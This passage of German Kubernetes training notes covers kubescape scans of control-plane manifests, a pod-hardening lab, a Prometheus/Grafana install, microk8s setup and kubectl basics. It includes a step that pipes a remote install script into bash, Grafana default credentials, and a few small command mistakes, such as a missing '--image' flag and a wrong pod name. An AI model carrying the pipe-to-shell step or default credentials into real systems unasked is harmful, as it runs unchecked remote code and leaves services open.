| `kubescape scan <datei/pfad>` | Kein Cluster-Zugang noetig, funktioniert auch im CI/CD |

---

### Schritt 1: Auf den Control-Plane-Node wechseln

Von der Bastion aus:

```
ssh -i /home/tln1/.ssh/id_rsa_k8s_do root@cp
```

---

### Schritt 2: Kubescape auf dem CP-Node installieren

```
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | bash
```

Das Binary landet in `~/.kubescape/bin/`. PATH fuer diese Session setzen:

```
export PATH=$PATH:/root/.kubescape/bin
kubescape version
```

**Erwartete Ausgabe:**
```
Your current version is: v4.0.6
```

---

### Schritt 3: Verfuegbare Frameworks anzeigen

Welche Frameworks kennt kubescape?

```
kubescape list frameworks
```

**Erwartete Ausgabe:**
```
╭──────────────────────╮
│ Supported frameworks │
├──────────────────────┤
│      AllControls     │
│       ArmoBest       │
│      DevOpsBest      │
│         MITRE        │
│          NSA         │
│         SOC2         │
│    cis-aks-t1.2.0    │
│    cis-aks-t1.8.0    │
│    cis-eks-t1.7.0    │
│    cis-eks-t1.8.0    │
│      cis-v1.10.0     │
│      cis-v1.12.0     │
╰──────────────────────╯
```

Kurze Orientierung — welches Framework fuer welchen Zweck:

| Framework | Fokus |
|-----------|-------|
| NSA | Breite Grundhaertung, guter Einstiegspunkt |
| MITRE | Angreiferverhalten (Taktiken und Techniken) |
| cis-v1.10.0 / cis-v1.12.0 | Detaillierte nummerierte CIS-Controls fuer Kubernetes |
| ArmoBest | NSA + MITRE kombiniert, empfohlen fuer schnellen Ueberblick |
| cis-aks-* / cis-eks-* | Cloud-spezifische Varianten (Azure AKS, AWS EKS) |
| SOC2 | Regulatorische Compliance |
| DevOpsBest | Reliabilitaet und Operabilitaet |

---

### Schritt 5: Control-Plane-Manifests anschauen

Was liegt dort ueberhaupt?

```
ls /etc/kubernetes/manifests/
```

**Erwartete Ausgabe:**
```
etcd.yaml
kube-apiserver.yaml
kube-controller-manager.yaml
kube-scheduler.yaml
```

Das sind die **Static Pod Manifests** — der kubelet startet diese Pods direkt,
ohne dass ein API-Server noetig ist. Sie definieren kube-apiserver, etcd,
controller-manager und scheduler vollstaendig.

---

### Schritt 6: Alle Manifests auf einmal scannen

```
kubescape scan /etc/kubernetes/manifests/
```

kubescape erkennt automatisch alle YAML-Dateien im Verzeichnis und
gibt eine kompakte Uebersicht der Findings:

**Erwartete Ausgabe:**
```
Security posture overview for repo: '/etc/kubernetes/manifests/'

Workload
| Control name        | Resources | View details                                        |
| HostNetwork access  |     4     | $ kubescape scan control C-0041 /etc/.../           |
| HostPath mount      |     4     | $ kubescape scan control C-0048 /etc/.../           |
| Non-root containers |     4     | $ kubescape scan control C-0013 /etc/.../           |
```

Und ganz unten: die **Highest-stake workloads** — kubescape bewertet,
welche Pods das groesste Risiko darstellen wuerden wenn sie kompromittiert werden.

> **Hinweis zu HostNetwork access (C-0041):**
> Alle vier Control-Plane-Pods (kube-apiserver, scheduler, controller-manager, etcd)
> sind mit `hostNetwork: true` konfiguriert — das ist **by Design** und kein Fehler.
> Sie muessen direkt an die Host-Netzwerk-Ports binden. Dieses Finding ist ein
> bekanntes strukturelles False-Positive fuer Control-Plane-Komponenten.

---

### Schritt 7: Mit NSA-Framework scannen

Jetzt gezielt gegen das NSA-Framework pruefen und den Compliance-Score sehen:

```
kubescape scan framework NSA /etc/kubernetes/manifests/
```

**Erwartete Ausgabe:**
```
Framework scanned: NSA

| Controls | 20 |
| Passed   | 12 |
| Failed   |  8 |

| Severity | Control name                   | Failed | Compliance |
| High     | HostNetwork access             |   4    |     0%     |
| High     | Ensure CPU limits are set      |   4    |     0%     |
| High     | Ensure memory limits are set   |   4    |     0%     |
| Medium   | Non-root containers            |   4    |     0%     |
| Medium   | Allow privilege escalation     |   4    |     0%     |
| Medium   | Ingress and Egress blocked     |   4    |     0%     |
| Low      | Immutable container filesystem |   4    |     0%     |

Resource Summary   4 / 4   60.00%
```

CPU/Memory limits und Non-root containers bei Control-Plane-Pods:
Das sind reale Findings — Control-Plane-Pods haben standardmaessig keine
Resource Limits und laufen als root.

---

### Schritt 8: CIS-Framework gezielt pruefen (online und offline)

#### Online-Modus

```
kubescape scan framework cis-v1.10.0 /etc/kubernetes/manifests/
```

Das CIS-Framework hat feinere Controls speziell fuer API-Server-Konfiguration:

**Erwartete Ausgabe:**
```
| Severity | Control name                                          | Compliance |
| High     | CIS-5.2.5 Minimize the admission of containers wi...  |     0%     |
| High     | CIS-5.7.3 Apply Security Context to Your Pods...      |     0%     |

Resource Summary   78.79%
```

CIS hat viele Controls die nur manuell geprueft werden koennen
(markiert als `Action Required *` — kein automatischer Check moeglich).

#### Offline-Modus

In air-gapped Umgebungen oder wenn kein Internet verfuegbar ist, koennen
alle Frameworks und Controls vorab heruntergeladen werden.

**Einmalig: Alle Daten herunterladen (benoetigt Internetzugang):**

```
kubescape download artifacts
```

**Erwartete Ausgabe:**
```
Downloaded  attack-tracks    /root/.kubescape/attack-tracks.json
Downloaded  controls-inputs  /root/.kubescape/controls-inputs.json
Downloaded  exceptions       /root/.kubescape/exceptions.json
Downloaded  framework  NSA           /root/.kubescape/nsa.json
Downloaded  framework  cis-v1.10.0   /root/.kubescape/cis-v1.10.0.json
Downloaded  framework  cis-v1.12.0   /root/.kubescape/cis-v1.12.0.json
Downloaded  framework  MITRE         /root/.kubescape/mitre.json
...
```

Was wurde gespeichert?

```
ls ~/.kubescape/
```

**Danach: Scan ohne Internetzugang mit `--use-artifacts-from`:**

```
kubescape scan framework cis-v1.10.0 /etc/kubernetes/manifests/ \
  --use-artifacts-from ~/.kubescape/
```

Das Ergebnis ist identisch — kubescape liest alle Policy-Daten aus dem
lokalen Cache statt sie vom Server abzurufen.

> **Tipp fuer CI/CD:** Die `~/.kubescape/*.json`-Dateien koennen ins
> Container-Image eingebaut oder als Artefakt weitergegeben werden.
> So laeuft kubescape komplett offline ohne externe Abhaengigkeit.

---

### Schritt 9: Einzelne Datei scannen — nur der API-Server

```
kubescape scan /etc/kubernetes/manifests/kube-apiserver.yaml -v
```

`-v` zeigt welche Controls genau fehlschlagen und an welcher Stelle
in der YAML-Datei das Problem liegt:

```
Security posture overview for repo: '/etc/kubernetes/manifests/kube-apiserver.yaml'

Workload
| HostNetwork access  | 1 | $ kubescape scan control C-0041 .../kube-apiserver.yaml -v |
| HostPath mount      | 1 | $ kubescape scan control C-0048 .../kube-apiserver.yaml -v |
| Non-root containers | 1 | $ kubescape scan control C-0013 .../kube-apiserver.yaml -v |
```

---

### Schritt 10: Ein einzelnes Control mit Details

Konkret nachschauen was HostPath-Mounts bei den Control-Plane-Pods bedeutet:

```
kubescape scan control C-0048 /etc/kubernetes/manifests/ -v
```

**Assisted remediation** zeigt den genauen Pfad in der YAML-Datei:
`spec.volumes[x].hostPath` — die Control-Plane-Pods mounten z.B.
`/etc/kubernetes/pki` und `/var/lib/etcd` direkt vom Host.

Auch das ist bei Control-Plane-Komponenten by Design und kein Fehler —
sie muessen auf TLS-Zertifikate und Datenbankdaten zugreifen.

---

### Schritt 11: API-Server haerten — Finding beheben und verifizieren

Wir beheben jetzt das NSA-Finding **"Allow privilege escalation"** (C-0016)
direkt in der kube-apiserver.yaml.

#### Schritt 11a: Backup — immer zuerst

```
cp /etc/kubernetes/manifests/kube-apiserver.yaml \
   /etc/kubernetes/manifests/kube-apiserver.yaml.bak
```

> **Wichtig:** Die Datei enthaelt eine kubeadm-verwaltete Annotation:
> `kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint`
> Diese darf nicht entfernt werden — kubeadm benoetigt sie fuer Upgrades.
> Das Backup sichert den exakten Originalzustand inkl. aller Annotations.

#### Schritt 11b: Container-securityContext ergaenzen

Aktuelle Situation in der Datei — kein container-level securityContext:

```
grep -n "securityContext\|resources:" /etc/kubernetes/manifests/kube-apiserver.yaml
```

```
## Erwartete Ausgabe:
69:    resources:
101:  securityContext:      <- das ist der Pod-Level securityContext
102:    seccompProfile:
```

`allowPrivilegeEscalation: false` auf Container-Ebene ergaenzen.
Der Eintrag kommt direkt nach dem `resources:`-Block:

```
vi /etc/kubernetes/manifests/kube-apiserver.yaml
```

Vor dem `startupProbe:` einfuegen:

```
    securityContext:
      allowPrivilegeEscalation: false
```

Das vollstaendige Ergebnis im Bereich resources sollte so aussehen:

```
    resources:
      requests:
        cpu: 250m
    securityContext:
      allowPrivilegeEscalation: false
    startupProbe:
```

> **Achtung:** Einrueckung exakt 4 Leerzeichen — das ist Container-Level,
> nicht Pod-Level. Der Pod-Level-Block steht weiter unten bei `hostNetwork`.

#### Schritt 11c: API-Server-Neustart abwarten

Der kubelet erkennt die Aenderung und startet den Static Pod automatisch neu.
Von der Bastion aus (anderes Terminal):

```
## auf Bastion:
until KUBECONFIG=/home/tln1/.kube/config kubectl cluster-info &>/dev/null; \
  do sleep 3; done && echo "API-Server wieder erreichbar"
```

#### Schritt 11d: Scan nach dem Fix

```
kubescape scan framework NSA /etc/kubernetes/manifests/kube-apiserver.yaml \
  --use-artifacts-from ~/.kubescape/
```

**Vorher:**
```
| Medium   | Allow privilege escalation     |   1    |     0%     |
...
Resource Summary   60.00%
```

**Nachher:**
```
## "Allow privilege escalation" taucht nicht mehr auf

Resource Summary   65.00%
```

Das Control C-0016 ist verschwunden — Finding behoben.

---

### Schritt 11e: Zuruecksetzen (Reset)

Nach der Uebung den Originalzustand wiederherstellen.
Das Backup enthaelt den genauen Stand vor der Aenderung —
inklusive der originalen kubeadm-Annotation:

```
cp /etc/kubernetes/manifests/kube-apiserver.yaml.bak \
   /etc/kubernetes/manifests/kube-apiserver.yaml
```

Warten bis der API-Server mit dem Original neu gestartet ist:

```
until KUBECONFIG=/home/tln1/.kube/config kubectl cluster-info &>/dev/null; \
  do sleep 3; done && echo "Reset erfolgreich"
```

Verifizieren dass keine securityContext-Zeile mehr im Container-Block steht:

```
grep -A2 "resources:" /etc/kubernetes/manifests/kube-apiserver.yaml | head -6
```

```
## Erwartete Ausgabe (kein securityContext-Block zwischen resources und startupProbe):
    resources:
      requests:
        cpu: 250m
    startupProbe:
```

Backup aufraeumen:

```
rm /etc/kubernetes/manifests/kube-apiserver.yaml.bak
```

---

### Schritt 12: Scan-Ergebnis als Report speichern

```
kubescape scan framework NSA /etc/kubernetes/manifests/ \
  --format json \
  --output /tmp/cp-nsa-report.json

kubescape scan framework cis-v1.10.0 /etc/kubernetes/manifests/ \
  --format json \
  --output /tmp/cp-cis-report.json
```

Reports anschauen:

```
cat /tmp/cp-nsa-report.json | python3 -m json.tool | head -40
```

JSON-Reports eignen sich gut fuer Weiterverarbeitung in CI/CD oder
Security-Dashboards.

---

### Schritt 12: Aufraumen auf dem CP-Node

```
rm -f /tmp/cp-nsa-report.json /tmp/cp-cis-report.json
```

Zurueck zur Bastion:

```
exit
```

---

### Zusammenfassung

| Befehl | Was er tut |
|--------|-----------|
| `kubescape list frameworks` | Alle verfuegbaren Frameworks anzeigen |
| `kubescape download artifacts` | Alle Frameworks/Controls lokal speichern (Offline-Vorbereitung) |
| `kubescape scan <pfad>` | Alle YAML-Dateien im Pfad scannen |
| `kubescape scan <datei>` | Einzelne YAML-Datei scannen |
| `kubescape scan framework NSA <pfad>` | Scan gegen NSA-Framework |
| `kubescape scan framework cis-v1.10.0 <pfad>` | Scan gegen CIS v1.10.0 |
| `kubescape scan framework cis-v1.10.0 <pfad> --use-artifacts-from ~/.kubescape/` | Offline-Scan aus lokalem Cache |
| `kubescape scan control C-0041 <pfad> -v` | Ein Control detailliert pruefen |
| `--format json --output report.json` | Ergebnis als JSON speichern |

**Wann welche Methode:**

| Szenario | Empfehlung |
|----------|-----------|
| CI/CD Pipeline (kein Cluster) | `kubescape scan <pfad>` gegen Manifest-Verzeichnis |
| Live-Cluster-Audit | `kubescape scan framework NSA` (ohne Pfad) |
| Control-Plane-Haertung | direkt auf CP-Node: `kubescape scan /etc/kubernetes/manifests/` |
| Einzelne Komponente pruefen | `kubescape scan /etc/kubernetes/manifests/kube-apiserver.yaml -v` |

### Referenzen

  * https://kubescape.io/docs/scanning/
  * https://hub.armosec.io/docs/c-0041 (HostNetwork access)
  * https://hub.armosec.io/docs/c-0048 (HostPath mount)

## Abschluss-Lab

### Kap. 5.1/5.2/5.3 - Pod Hardening Lab: SecurityContext, NetworkPolicy, RBAC


**Schwierigkeit:** Mittel
**Voraussetzungen:** SecurityContext-Uebung, NetworkPolicy-Uebung, RBAC-Uebung absolviert

---

### Lernziele

Nach dieser Uebung kannst du:

- Pods mit sicherem `securityContext` ausstatten (non-root, read-only, Capabilities, Seccomp)
- Pod-zu-Pod-Traffic mit `NetworkPolicy` einschraenken
- Einen dedizierten `ServiceAccount` mit minimalen RBAC-Rechten betreiben

---

### Szenario

Ein Entwicklerteam hat eine kleine Web-App deployed: ein `frontend`-Pod (nginx) erreicht
ueber einen Service einen `backend`-Pod (httpbin). Beides laeuft als root, ohne
NetworkPolicy, mit dem Default-ServiceAccount.

Du sollst das Setup haerten.

---

### Vorbereitung

```
export NS=tln<nr>
kubectl config set-context --current --namespace=$NS
```

```
cd
mkdir -p manifests/pod-hardening
cd manifests/pod-hardening
```

---

### Ausgangslage (unsicher)

```
nano 00-baseline.yml
```

```
## vi 00-baseline.yml
apiVersion: v1
kind: Pod
metadata:
  name: backend
  labels:
    app: backend
spec:
  containers:
  - name: app
    image: kennethreitz/httpbin
    ports:
    - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: backend
spec:
  selector:
    app: backend
  ports:
  - port: 80
    targetPort: 80
---
apiVersion: v1
kind: Pod
metadata:
  name: frontend
  labels:
    app: frontend
spec:
  containers:
  - name: web
    image: nginx:1.27
    ports:
    - containerPort: 80
```

```
kubectl apply -f 00-baseline.yml
kubectl get pod,svc
```

Warten bis beide Pods laufen:

```
kubectl wait pod frontend backend --for=condition=Ready --timeout=90s
```

Verifizieren, dass Frontend Backend erreicht:

```
kubectl exec frontend -- curl -s http://backend/get | head -20
```

---

### Aufgabe 1: SecurityContext haerten

Beide Pods sollen:

- als **non-root** laufen (UID 1000)
- ein **read-only** Root-Filesystem haben
- **alle Capabilities** droppen
- **Privilege-Escalation** unterbinden
- das `RuntimeDefault` seccomp-Profil nutzen

> Hinweis: Fuer nginx verwende `nginxinc/nginx-unprivileged:1.27` (Port 8080).
> Fuer httpbin braucht `/tmp` ein `emptyDir`-Volume.

---

### Aufgabe 2: NetworkPolicy

- **Default-Deny** fuer allen Ingress- und Egress-Traffic im Namespace
- Frontend darf **DNS** (kube-system, UDP/TCP 53) nutzen
- Frontend darf das Backend auf **Port 80** erreichen
- Backend darf **DNS** nutzen, nimmt sonst keinen Egress an
- Backend nimmt **nur Ingress vom Frontend** an

---

### Aufgabe 3: RBAC & ServiceAccount

- Der `default`-ServiceAccount soll **kein** Token mehr automounten
- Lege einen `ServiceAccount` `frontend-sa` an (kein Token-Automount)
- Lege eine `Role` `pod-reader` an: nur `get`/`list` auf `pods`
- Binde die Rolle an `frontend-sa`
- Frontend-Pod nutzt `frontend-sa`

---

### Aufgabe 4: Validierung

Pruefe nach dem Hardening:

```
## 1. Beide Pods laufen
kubectl get pod

## 2. Frontend erreicht Backend weiterhin
kubectl exec frontend -- curl -s http://backend/get | head -5

## 3. Externer Traffic geblockt
kubectl exec frontend -- curl -s --max-time 5 http://example.com

## 4. Backend kann Frontend nicht erreichen
kubectl exec backend -- curl -s --max-time 5 http://frontend

## 5. RBAC: frontend-sa darf Pods lesen
kubectl auth can-i get pods --as=system:serviceaccount:$NS:frontend-sa

## 6. RBAC: frontend-sa darf keine Pods loeschen
kubectl auth can-i delete pods --as=system:serviceaccount:$NS:frontend-sa
```

**Erwartete Ergebnisse:**
- Aufgabe 2: Timeout (Egress geblockt)
- Aufgabe 3: Timeout (kein Ingress zum Frontend)
- Aufgabe 5: `yes`
- Aufgabe 6: `no`

---

### Aufraeumen

```
kubectl delete -f 03-rbac.yml -f 02-networkpolicies.yml \
               -f 01-pods-hardened.yml -f 00-baseline.yml \
               --ignore-not-found
kubectl patch serviceaccount default -p '{"automountServiceAccountToken": true}'
```

---

### Referenzen

  * https://kubernetes.io/docs/tasks/configure-pod-container/security-context/
  * https://kubernetes.io/docs/concepts/services-networking/network-policies/
  * https://kubernetes.io/docs/reference/access-authn-authz/rbac/
  * https://www.cisecurity.org/benchmark/kubernetes (Sektion 5.1, 5.2, 5.3)

## Kubernetes Monitoring - Prometheus/Grafana

### Prometheus Monitoring Server (Überblick)


### What does it do ?

  * It monitors your system by collecting data
  * Data is pulled from your system by defined endpoints (http) from your cluster 
  * To provide data on your system, a lot of exporters are available, that
    * collect the data and provide it in Prometheus

### Technical 

  * Prometheus has a TDB (Time Series Database) and is good as storing time series with data
  * Prometheus includes a local on-disk time series database, but also optionally integrates with remote storage systems.
  * Prometheus's local time series database stores data in a custom, highly efficient format on local storage.
  * Ref: https://prometheus.io/docs/prometheus/latest/storage/

### What are time series ? 

  * A time series is a sequence of data points that occur in successive order over some period of time. 
  * Beispiel: 
    * Du willst die täglichen Schlusspreise für eine Aktie für ein Jahr dokumentieren
    * Damit willst Du weitere Analysen machen 
    * Du würdest das Paar Datum/Preis dann in der Datumsreihenfolge sortieren und so ausgeben
    * Dies wäre eine "time series" 

### Kompenenten von Prometheus 

![Prometheus Schaubild](https://www.devopsschool.com/blog/wp-content/uploads/2021/01/What-is-Prometheus-Architecutre-components1-740x414.png)

Quelle: https://www.devopsschool.com/

#### Prometheus Server 

1. Retrieval (Sammeln) 
   * Data Retrieval Worker 
     * pull metrics data
1. Storage 
   * Time Series Database (TDB)
     * stores metrics data
1. HTTP Server 
   * Accepts PromQL - Queries (e.g. from Grafana)
     * accept queries 
  
### Grafana ? 

  * Grafana wird meist verwendet um die grafische Auswertung zu machen.
  * Mit Grafana kann ich einfach Dashboards verwenden 
  * Ich kann sehr leicht festlegen (Durch Data Sources), so meine Daten herkommen

### Prometheus / Grafana Stack mit Helm installieren


  * using the kube-prometheus-stack (recommended !: includes important metrics)

### Step 1: Prepare values-file  

```
cd
mkdir -p manifests 
cd manifests 
mkdir -p monitoring 
cd monitoring 
```

```
vi values.yml 
```

```
fullnameOverride: prometheus

alertmanager:
  fullnameOverride: alertmanager

grafana:
  fullnameOverride: grafana

kube-state-metrics:
  fullnameOverride: kube-state-metrics

prometheus-node-exporter:
  fullnameOverride: node-exporter
```

### Step 2: Install with helm 

```
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helm install prometheus prometheus-community/kube-prometheus-stack -f values.yml --namespace monitoring --create-namespace --version 61.3.1
```

### Step 3: Connect to prometheus from the outside world 

#### Step 3.1: Start proxy to connect (on Bastion-Server)

```
## this is shown in the helm information 
helm -n monitoring get notes prometheus

## Get pod that runs prometheus 
kubectl -n monitoring get service 
kubectl -n monitoring port-forward svc/prometheus-prometheus 9090 &
```

#### Step 3.2: Start a tunnel from your local system to the Bastion-Server 

```
## Replace tln1 with your own user
ssh -L 9090:localhost:9090 tln1@161.35.210.204
```

#### Step 3.3: Open prometheus in your local browser 

```
## in browser
http://localhost:9090 
```

### Step 4: Connect to Grafana from the outside world 

#### Step 4.1: Start proxy to connect (on Bastion-Server)

```
## Do the port forwarding 
## Adjust your pod name here
kubectl -n monitoring get pods | grep grafana 
kubectl -n monitoring port-forward svc/grafana 3000 &
```

#### Step 4.2: Start a tunnel from your local system to the Bastion-Server 

```
## Replace tln1 with your own user
ssh -L 3000:localhost:3000 tln1@161.35.210.204
```

#### Step 4.3: Open Grafana in your local browser

```
## in browser
http://localhost:3000

## Default credentials
User: admin
Password: prom-operator
```

### References:

  * https://github.com/prometheus-community/helm-charts/blob/main/charts/kube-prometheus-stack/README.md
  * https://artifacthub.io/packages/helm/prometheus-community/prometheus

### Kubernetes Grafana Dashboards


  * Das einfachste ist, man verwendet vorgefertigte Dashboards und passt diese für sich an.

### Diese Dashboards können jeweils einfach über die entsprechende ID geladen werden 

```
z.B. k8s-views-pods.json	15760
```

  * https://grafana.com/grafana/dashboards/
  * https://grafana.com/grafana/dashboards/15760-kubernetes-views-pods/

### Ref: 

  * https://0xdc.me/blog/a-set-of-modern-grafana-dashboards-for-kubernetes/
  * https://github.com/dotdc/grafana-dashboards-kubernetes?tab=readme-ov-file#install-via-grafanacom

### Installation Ubuntu - snap


### Walkthrough

```
sudo snap install microk8s --classic
microk8s status

## Sobald Kubernetes zur Verfügung steht aktivieren wir noch das plugin dns
microk8s status
```

### Optional

```
## Execute kubectl commands like so 
microk8s kubectl
microk8s kubectl cluster-info

## Make it easier with an alias 
echo "alias kubectl='microk8s kubectl'" >> ~/.bashrc
source ~/.bashrc
kubectl

```
### Working with snaps 

```
snap info microk8s 

```

### Ref:

  * https://microk8s.io/docs/setting-snap-channel

### Create a cluster with microk8s


### Walkthrough 

```
## auf master (jeweils für jedes node neu ausführen)
microk8s add-node

## dann auf jeweiligem node vorigen Befehl der ausgegeben wurde ausführen
## Kann mehr als 60 sekunden dauern ! Geduld...Geduld..Geduld 
##z.B. -> ACHTUNG evtl. IP ändern 
microk8s join 10.128.63.86:25000/567a21bdfc9a64738ef4b3286b2b8a69

```

### Auf einem Node addon aktivieren z.B. ingress

```
gucken, ob es auf dem anderen node auch aktiv ist. 
```

### Ref:

  * https://microk8s.io/docs/high-availability

### Remote-Verbindung zu Kubernetes (microk8s) einrichten


```
## on CLIENT install kubectl 
sudo snap install kubectl --classic 

## On MASTER -server get config 
## als root
cd
microk8s config > /home/kurs/remote_config 

## Download (scp config file) and store in .kube - folder  
cd ~
mkdir .kube
cd .kube  # Wichtig: config muss nachher im verzeichnis .kube liegen 
## scp kurs@master_server:/path/to/remote_config config 
## z.B. 
scp kurs@192.168.56.102:/home/kurs/remote_config config
## oder benutzer 11trainingdo
scp 11trainingdo@192.168.56.102:/home/11trainingdo/remote_config config 

##### Evtl. IP-Adresse in config zum Server aendern 

## Ultimative 1. Test auf CLIENT 
kubectl cluster-info 

## or if using kubectl or alias 
kubectl get pods 

## if you want to use a different kube config file, you can do like so 
kubectl --kubeconfig /home/myuser/.kube/myconfig

```

### Bash completion installieren


### Walkthrough 

```
## Eventuell, wenn bash-completion nicht installiert ist.
apt install bash-completion
source /usr/share/bash-completion/bash_completion
## is it installed properly 
type _init_completion
```

```
## activate for all users 
kubectl completion bash | sudo tee /etc/bash_completion.d/kubectl > /dev/null

## verifizieren - neue login shell
su -

## zum Testen
kubectl g<TAB> 
kubectl get 
```
### Alternative für k als alias für kubectl 

```
source <(kubectl completion bash)
complete -F __start_kubectl k

```

### Reference 

  * https://kubernetes.io/docs/tasks/tools/included/optional-kubectl-configs-bash-linux/

### vim support for yaml


### Ubuntu (im Unterverzeichnis /etc/vim/vimrc.local - systemweit) 

```
hi CursorColumn cterm=NONE ctermbg=lightred ctermfg=white
autocmd FileType y?ml setlocal ts=2 sts=2 sw=2 ai number expandtab cursorline cursorcolumn
```

### Testen 

```
vim test.yml 
Eigenschaft: <return> # springt eingerückt in die nächste Zeile um 2 spaces eingerückt

## evtl funktioniert vi test.yml auf manchen Systemen nicht, weil kein vim (vi improved) 


```

### nano-support for yaml


### Ubuntu (im Unterverzeichnis /etc/nanorc - systemweit) 

#### Schritt 1: Wir testen die Version

```
## - Es sollte mindestens die Version 5.9
## - Die kommt mit der Datei für Syntax-Highlightning
nano --version
```

#### Schritt 2: Konfigurationen setzen 

```
## 2.1 Syntax Hightlightning 
echo "include /usr/share/nano/yaml.nanorc" >> /etc/nanorc 
## 2.2 Automatische Einrückung 
echo "set autoindent" >> /etc/nanorc
## 2.3 Einrückung durch Tab 2 Stellen 
echo "set tabsize 2" >> /etc/nanorc
## 2.4 Tabs werden automatisch in Leerzeichen umgewandelt
## - yaml mag keine TAB-Zeichen
echo "set tabstospaces" >> /etc/nanorc 
```

#### Schritt 3: Testen 

```
nano test.yml 
```

#### Schritt 4: Jetzt im Nano gib' ein:

```
test:
## Wow, es funktioniert, die Farben sind da.
```

#### Schritt 5: Verlasse nano 

```
CTRL + x
```

#### Schritt 6: Nano fragt Dich:

```
## Save modified buffer ?
## Du drückst die Taste:
n 
```

### Ingress controller in microk8s aktivieren


### Aktivieren

```
microk8s enable ingress
```

### Referenz 

  * https://microk8s.io/docs/addon-ingress

## Kubernetes Praxis API-Objekte 

### Das Tool kubectl (Devs/Ops) - Spickzettel


### Allgemein 

```
## Zeige Information über das Cluster 
kubectl cluster-info 

## Welche api-resources gibt es ?
kubectl api-resources 

## Hilfe zu object und eigenschaften bekommen
kubectl explain pod 
kubectl explain pod.metadata
kubectl explain pod.metadata.name 

```

### Arbeiten mit manifesten 

```
kubectl apply -f nginx-replicaset.yml 
## Wie ist aktuell die hinterlegte config im system
kubectl get -o yaml -f nginx-replicaset.yml 

## Änderung in nginx-replicaset.yml z.B. replicas: 4 
## dry-run - was wird geändert 
kubectl diff -f nginx-replicaset.yml 

## anwenden 
kubectl apply -f nginx-replicaset.yml 

## Alle Objekte aus manifest löschen
kubectl delete -f nginx-replicaset.yml 


```

### Ausgabeformate 

```
## Ausgabe kann in verschiedenen Formaten erfolgen 
kubectl get pods -o wide # weitere informationen 
## im json format
kubectl get pods -o json 

## gilt natürluch auch für andere kommandos
kubectl get deploy -o json 
kubectl get deploy -o yaml 
```



### Zu den Pods 

```
## Start einen pod // BESSER: direkt manifest verwenden
## kubectl run podname image=imagename 
kubectl run nginx image=nginx 

## Pods anzeigen 
kubectl get pods 
kubectl get pod
## Format weitere Information 
kubectl get pod -o wide 
## Zeige labels der Pods
kubectl get pods --show-labels 

## Zeige pods mit einem bestimmten label 
kubectl get pods -l app=nginx 

## Status eines Pods anzeigen 
kubectl describe pod nginx 

## Pod löschen 
kubectl delete pod nginx 

## Kommando in pod ausführen 
kubectl exec -it nginx -- bash 

```

### Arbeiten mit namespaces 

```
## Welche namespaces auf dem System 
kubectl get ns 
kubectl get namespaces 
## Standardmäßig wird immer der default namespace verwendet 
## wenn man kommandos aufruft 
kubectl get deployments 

## Möchte ich z.B. deployment vom kube-system (installation) aufrufen, 
## kann ich den namespace angeben
kubectl get deployments --namespace=kube-system 
kubectl get deployments -n kube-system 

## wir wollen unseren default namespace ändern 
kubectl config set-context --current --namespace <dein-namespace>
```



### Referenz

  * https://kubernetes.io/de/docs/reference/kubectl/cheatsheet/

### kubectl example with run


### Beispiel 1 (das funktioniert)

```
## Zeigt mir die Pods die laufen
kubectl get pods 

## Aufbau des Befehls  
## kubectl run NAME --image=IMAGE_EG_FROM_DOCKER

## Ein Beispiel
kubectl run nginx --image=nginx:1.25.1

kubectl get pods 
## Alle nodes anzeigen
kubectl get nodes -o wide 
## Auf welchem Node läuft der Pods
kubectl get pods -o wide 
```

### Beispiel 2 (das nicht funktioniert !!)

```
kubectl run sonnenschein --image=foo2
## Ergebnis-> pod/sonnenschein created
## ABER: 
## ImageErrPull - Image konnte nicht geladen werden  => bedeutet pod läuft nicht, obwohl nicht 
kubectl get pods 
## Weitere status - info 
kubectl describe pods sonnenschein
```

### Beide Pods wieder löschen

```
kubectl delete pods nginx foo2 
kubectl get pods
```

### Referenz:

  * https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#run

### Bauen einer Applikation mit Resource Objekten


![Bauen einer Webanwendung](images/WebApp.drawio.png)

### kubectl/manifest/pod


### Walkthrough 

```
cd 
mkdir -p manifests
cd manifests
mkdir -p web
cd web
```

```
## vi nginx-static.yml 
nano nginx-static.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-static-web
  labels:
    webserver: nginx
spec:
  containers:
  - name: web
    image: nginx:1.25.1

```

```
kubectl apply -f nginx-static.yml 
kubectl describe pod nginx-static-web 
## Zeige die Konfiguration
kubectl get pod/nginx-static-web -o yaml
kubectl get pod/nginx-static-web -o wide 
```

### kubectl/manifest/replicaset


```
cd
mkdir -p manifests
cd manifests
mkdir 02-rs 
cd 02-rs 
vi rs.yml
```

```
apiVersion: apps/v1
kind: ReplicaSet
metadata:
  name: nginx-replica-set
spec:
  replicas: 2
  selector:
    matchLabels:
      tier: frontend
  template:
    metadata:
      name: template-nginx-replica-set
      labels:
        tier: frontend
    spec:
      containers:
        - name: nginx
          image: nginx:1.21
          ports:
            - containerPort: 80
             

             
```

```
kubectl apply -f rs.yml 
```

### kubectl/manifest/deployments


```
cd
cd manifests
mkdir 03-deploy
cd 03-deploy 
nano deploy.yml 
```

```

## vi deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
spec:
  selector:
    matchLabels:
      app: nginx
  replicas: 8 
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.21
        ports:
        - containerPort: 80
        
```

```
kubectl apply -f deploy.yml 
```

### Explore 

```
kubectl get all
```

### Optional: Change image - Version 

```
nano nginx-deployment.yml 
```


#### Version 1: (optical nicer)

```
## Ändern des images von nginx:1.21 -> auf 1.22
## danach 
kubectl apply -f . && watch kubectl get pods 
```

#### Version 2: 

```
## Ändern des images von nginxinc/nginx-unprivileged:1.28 -> auf 1.29
## danach 
kubectl apply -f . && kubectl get all && kubectl get pods -w
```

### Services - Aufbau


![Services Aufbau](/images/kubernetes-services.drawio.svg)

### kubectl/manifest/service


### Warum Services ? 

  * Wenn in einem Deployment bei einem Wechsel des images neue Pods erstellt werden, erhalten diese eine neue IP-Adresse
  * Nachteil: Man müsste diese dann in allen Applikation ständig ändern, die auf die Pods zugreifen.
  * Lösung: Wir schalten einen Service davor !

### Hintergrund IP-Wechsel 
 
 <img width="930" height="134" alt="image" src="https://github.com/user-attachments/assets/26c16134-1f2a-4b42-8cca-355099d08604" />

 * Image-Version wurde jetzt in Deployment geändert, Ergebnis:

